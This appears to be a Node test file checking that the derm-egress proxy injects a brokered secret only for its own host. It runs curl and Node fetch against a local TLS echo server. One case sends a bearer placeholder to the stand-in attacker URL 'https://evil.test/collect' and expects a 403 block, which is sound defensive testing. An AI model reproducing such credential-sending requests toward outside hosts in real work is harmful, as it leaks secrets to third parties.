// Lane 6C (wave 6): derm-egress against real clients. The real `curl` and the
// real Node go through derm-egress's dev binary (crates/derm-egress/examples/
// egress_dev.rs) with exactly the variables `derm run`'s chain sets for a
// brokered chat (crates/derm-cli/src/secret/chain.rs: HTTPS_PROXY, and
// SSL_CERT_FILE / CURL_CA_BUNDLE for curl, NODE_EXTRA_CA_CERTS and
// NODE_USE_ENV_PROXY=1 for Node; note AZ C4). Each client sends the chat's
// placeholder to the secret's own host, where the echo upstream must see the
// value, and to another host, where derm-egress must answer 403 and record a
// `secret.block` (case 217). No record may hold the value or the placeholder.
//
//   cargo build -p derm-egress --example egress_dev
//   node tests/cli-contract/run.mjs --cli curl=/usr/bin/curl --cli node=$(command -v node) --only egress-curl,egress-node
//
// The upstream is a local TLS server every name resolves to inside the dev
// binary, so nothing leaves the machine.

import { execFileSync, spawn } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createInterface } from "node:readline";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const VALUE = "made-up-value-for-the-contract-check-0000";

function devBin() {
  for (const p of [process.env.EGRESS_DEV, path.join(ROOT, "target", "debug", "examples", "egress_dev"), path.join(ROOT, "target", "release", "examples", "egress_dev")]) {
    if (p && existsSync(p)) return p;
  }
  return undefined;
}

async function startDev() {
  const bin = devBin();
  if (!bin) throw new Error("egress_dev not built: cargo build -p derm-egress --example egress_dev");
  const dir = mkdtempSync(path.join(tmpdir(), "derm-6c-"));
  const child = spawn(bin, [dir], { env: { ...process.env, DEV_SECRET_VALUE: VALUE }, stdio: ["pipe", "pipe", "inherit"] });
  const line = await new Promise((resolve, reject) => {
    const rl = createInterface({ input: child.stdout });
    rl.once("line", resolve);
    child.once("exit", (c) => reject(new Error(`egress_dev exited ${c}`)));
  });
  return { child, dir, info: JSON.parse(line) };
}

function stopDev(d) {
  d.child.stdin.end();
  d.child.kill();
  rmSync(d.dir, { recursive: true, force: true });
}

function records(d) {
  return readFileSync(d.info.records, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l));
}

async function waitFor(d, pred, ms = 3000) {
  const t = Date.now();
  while (Date.now() - t < ms) {
    if (pred(records(d))) return true;
    await new Promise((r) => setTimeout(r, 50));
  }
  return false;
}

/** Both cases through one client; `send(url, ph)` returns { status, body }. */
async function both(d, send) {
  const ph = d.info.placeholder;
  const own = await send("https://api.github.com/user", ph);
  if (own.status !== 200) return { status: "fail", finding: `own host: HTTP ${own.status} ${own.body.slice(0, 200)}` };
  const echo = JSON.parse(own.body);
  if (!echo.authHasValue || echo.authHasPlaceholder) return { status: "fail", finding: `own host: the upstream saw ${JSON.stringify(echo)}` };
  const other = await send("https://evil.test/collect", ph);
  if (other.status !== 403) return { status: "fail", finding: `other host: HTTP ${other.status}, not 403` };
  const ok = await waitFor(d, (r) => r.some((e) => e.kind === "secret.block") && r.filter((e) => e.kind === "egress.connect").length >= 2);
  const rs = records(d);
  const text = JSON.stringify(rs);
  if (!ok) return { status: "fail", finding: `records: ${rs.map((e) => e.kind).join(",")}` };
  if (text.includes(VALUE) || text.includes(ph)) return { status: "fail", finding: "a record holds the value or the placeholder" };
  const inject = rs.find((e) => e.kind === "secret.inject");
  const block = rs.find((e) => e.kind === "secret.block");
  if (!inject || inject.detail.host !== "api.github.com" || block.detail.host !== "evil.test" || block.detail.place !== "header") {
    return { status: "fail", finding: `records: ${text.slice(0, 400)}` };
  }
  return { status: "pass", finding: "swapped for api.github.com on the wire; 403 and secret.block (header) for evil.test; no record holds the value or the placeholder" };
}

function curlSend(bin, d) {
  return async (url, ph) => {
    const env = { ...process.env, HTTPS_PROXY: d.info.proxy, https_proxy: d.info.proxy, SSL_CERT_FILE: d.info.bundle, CURL_CA_BUNDLE: d.info.bundle, NO_PROXY: "localhost,127.0.0.1,::1" };
    const out = execFileSync(bin, ["-sS", "-o", "-", "-w", "\n%{http_code}", "-H", `Authorization: Bearer ${ph}`, url], { env, encoding: "utf8", timeout: 20000 });
    const i = out.lastIndexOf("\n");
    return { status: Number(out.slice(i + 1)), body: out.slice(0, i) };
  };
}

function nodeSend(bin, d) {
  return async (url, ph) => {
    const env = { ...process.env, HTTPS_PROXY: d.info.proxy, https_proxy: d.info.proxy, NODE_USE_ENV_PROXY: "1", NODE_EXTRA_CA_CERTS: d.info.ca, NO_PROXY: "localhost,127.0.0.1,::1" };
    const script = `fetch(${JSON.stringify(url)}, { headers: { authorization: "Bearer " + process.env.PH } }).then(async (r) => { process.stdout.write(r.status + "\\n" + (await r.text())); }).catch((e) => { process.stdout.write("0\\n" + String(e && e.cause || e)); });`;
    const out = execFileSync(bin, ["-e", script], { env: { ...env, PH: ph }, encoding: "utf8", timeout: 20000 });
    const i = out.indexOf("\n");
    return { status: Number(out.slice(0, i)), body: out.slice(i + 1) };
  };
}

async function withDev(fn) {
  let d;
  try {
    d = await startDev();
  } catch (e) {
    return { status: "error", finding: String(e.message || e) };
  }
  try {
    return await fn(d);
  } catch (e) {
    return { status: "fail", finding: String(e.message || e).slice(0, 400) };
  } finally {
    stopDev(d);
  }
}

export const checks = [
  {
    id: "egress-curl",
    title: "derm-egress: curl with the chain's variables gets the secret swapped for its host and blocked elsewhere",
    harness: "curl",
    run: ({ binPath }) =>
      withDev(async (d) => {
        // Control: without the trust variables curl must refuse derm's leaf
        // (exit 60, a certificate problem), so the swap below happened inside
        // derm's own TLS termination.
        let code = 0;
        try {
          execFileSync(binPath, ["-sS", "-o", "/dev/null", "--cacert", "/dev/null", "https://api.github.com/user"], {
            env: { ...process.env, HTTPS_PROXY: d.info.proxy, SSL_CERT_FILE: "", CURL_CA_BUNDLE: "" },
            stdio: "ignore",
            timeout: 20000,
          });
        } catch (e) {
          code = e.status;
        }
        if (code !== 60 && code !== 77) return { status: "fail", finding: `control: curl without derm's CA exited ${code}, not 60` };
        return both(d, curlSend(binPath, d));
      }),
  },
  {
    id: "egress-node",
    title: "derm-egress: Node fetch with NODE_USE_ENV_PROXY and NODE_EXTRA_CA_CERTS gets the same",
    harness: "node",
    run: ({ binPath }) => withDev((d) => both(d, nodeSend(binPath, d))),
  },
];

// Run on its own: node tests/cli-contract/checks/6C/egress.mjs [--curl <path>] [--node <path>]
if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const arg = (k, dflt) => {
    const i = process.argv.indexOf(k);
    return i > 0 ? process.argv[i + 1] : dflt;
  };
  const bins = { curl: arg("--curl", "/usr/bin/curl"), node: arg("--node", process.execPath) };
  for (const c of checks) {
    const r = await c.run({ binPath: bins[c.harness] });
    console.log(`${c.id}: ${r.status}: ${r.finding}`);
  }
}
